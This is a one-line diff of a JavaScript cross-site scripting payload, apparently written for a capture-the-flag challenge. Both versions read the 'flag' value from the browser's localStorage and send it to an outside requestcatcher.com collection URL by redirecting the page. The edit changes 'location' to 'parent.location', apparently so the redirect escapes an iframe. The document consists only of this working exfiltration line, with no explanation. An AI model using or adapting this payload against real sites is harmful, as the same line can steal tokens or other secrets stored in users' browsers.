@@ -1,1 +1,1 @@
-location = 'https://sdfsdfsd.requestcatcher.com/?' + localStorage.getItem('flag')
+parent.location = 'https://sdfsdfsd.requestcatcher.com/?' + localStorage.getItem('flag')
